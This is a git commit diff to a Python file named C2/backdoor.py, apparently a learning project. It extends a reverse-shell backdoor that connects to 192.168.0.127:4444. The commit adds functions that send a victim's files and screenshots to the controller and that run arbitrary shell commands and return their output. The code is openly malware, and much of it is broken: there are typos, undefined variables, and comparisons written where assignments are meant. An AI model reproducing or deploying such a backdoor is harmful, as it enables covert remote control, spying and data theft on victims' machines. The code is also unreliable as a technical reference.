926690bbe20ea4c44cf79fd42b2eda0f85c42362
isaacneiff <59800867+isaacneiff@users.noreply.github.com>
2024-09-24 17:58:17 +0000

    Update backdoor.py

--- C2/backdoor.py
+++ C2/backdoor.py
@@ -5,14 +5,27 @@ import os
 import pyautogui
 
 
+def dados_env():
+    jsondata = json.dump(data)
+    sock.send(jsondata.encode())
+
 def dados_rec():
     dados  = ''
     while True:
         try:
-            data = dados + sock.recv(1024).decode().rstrip()
+            data = data + target.recv(1024).decode().rstrip()
             return json.loads(data)
         except ValueError:
             continue
+
+def upload_file(file):
+    f = open(file, 'rb')
+    sock.send(f.read())
+
+def screenshot():
+    screenshot = pyautogui.screenshot()
+    screenshot.save(screen.png)
+
 
 def download_file(file):
     f = open(file, 'wb')
@@ -38,7 +51,20 @@ def shell():
             os.chdir(comando_foda[3:])
         elif comando_foda [:6] == 'upload':
             download_file(comando_foda[7:])
+        elif comando_foda [:8] == 'download':
+            upload_file(comando_foda[9:])
+        elif comando_foda [:10] == 'screenshot':
+            screenshot ()
+            upload_file('screen.png')
+            os.remove('screen.png')
+        elif comando_foda == 'help':
+            pass
+        else:
+            exe = subprocess.Popen(comando_foda, shell=True, stdout=subprocess.PIPE, sdterr=subprocess.PIPE, stdin=subprocess.PIPE)
+            comando_foda_rec == exe.stdout.read() + exe.stderr.read()
+            comando_foda_rec == comando_foda_rec.decode()
+            dados_env(comando_foda_rec)
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock = socket.socket(socket.AF_INET, sock.SOCK_STREAM)
 sock.connect(("192.168.0.127", 4444))
 shell ()
